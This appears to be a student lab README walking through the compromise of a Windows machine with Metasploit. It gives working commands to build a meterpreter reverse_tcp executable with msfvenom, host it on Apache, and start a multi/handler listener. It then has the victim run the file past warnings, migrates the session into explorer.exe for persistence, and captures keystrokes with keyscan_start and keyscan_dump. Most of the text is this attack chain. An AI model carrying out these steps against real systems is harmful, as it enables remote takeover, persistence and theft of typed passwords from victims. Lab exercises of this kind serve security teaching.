# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/00d146f1-d14e-4a64-a67a-e53e332e4444)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/1e780f98-06c9-4209-b0ec-b199a06ce3d2)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/656645e6-c6b7-43d5-a97d-55b900d4d2ba)

Start apache server
sudo systemctl apache2 start

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/dcb3068a-0fcc-487f-9a30-0e02e23d0c6d)

Check the status of apache2

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/000fec71-9333-4adc-aba4-cd4b8f0d1359)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/4262f49d-cd4f-4176-94a9-a88a008a3c52)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/a0414548-f155-4214-9c74-544372608050)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/d5051c2d-f1ae-4b9a-8e9a-e299d813ad0e)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/2a95ff8e-03a7-46bd-a872-069bdc67fc04)

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/19f0c973-5ac5-452e-bd91-1e9f32848b53)

keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/charu-dharshinii/Compromising-windows-using-Metasploit/assets/130828943/4363554a-91a9-4abf-8aae-031462b6aa69)


## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
